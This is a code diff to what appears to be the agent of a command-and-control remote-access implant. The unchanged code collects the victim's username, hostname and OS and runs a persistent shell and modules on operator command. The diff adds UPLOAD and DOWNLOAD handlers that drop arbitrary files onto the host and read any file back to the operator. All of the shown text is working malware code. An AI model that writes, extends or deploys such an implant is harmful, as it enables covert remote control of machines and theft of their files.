@@ -25,7 +25,7 @@ class Request:
         self.headers = {}
         self.params = {}
         self.data = b""
-        self.header_separator = b"||" 
+        self.header_separator = b":|::|:" 
         self.header = b""
         self.task_id = b""
         self.url = b""
@@ -56,6 +56,9 @@ class Request:
 
     def set_header(self, header):
         self.header = header if isinstance(header, bytes) else header.encode()
+
+    def get_header_separator(self):
+        return self.header_separator
 
     def send(self):
         if not self.method or not self.url:
@@ -248,7 +251,8 @@ def get_system_info():
     elif 'arm' in arch:
         arch = 'arm'
 
-    return f"{username}||{hostname}||{os_type}-{arch}"
+    sep = Request().get_header_separator().decode()
+    return f"{username}{sep}{hostname}{sep}{os_type}-{arch}"
 
 def shell(agent_id):
     shell = PersistentShell()
@@ -317,6 +321,30 @@ def execute_module(data):
             
         return result
 
+def upload(data):
+    parts = data.split(b"::::")
+    name = parts[0].decode()
+    data = parts[1]
+    
+    with open(name, "wb") as f:
+        f.write(data)
+
+    file_path = f"{os.getcwd()}\\{name}"
+        
+    return None, f"File saved at {file_path}"
+
+def download(data):
+    parts = data.split(b"::::")
+    file_path = parts[1]
+
+    if not os.path.isfile(file_path.decode()):
+        return b"DOWNLOAD_FILE_NOTFOUND", file_path
+    
+    with open(file_path, "rb") as f:
+        data = f.read()
+        
+    return b"DOWNLOAD_FILE_OK", data
+
 def main():
 
     agent_id = auth()
@@ -335,6 +363,10 @@ def main():
                     response = shell(agent_id)
                 case "MODULE":
                     header, response = execute_module(cmd)
+                case "UPLOAD":
+                    header, response = upload(cmd)
+                case "DOWNLOAD":
+                    header, response = download(cmd)
                 case _:
                     pass
         else:
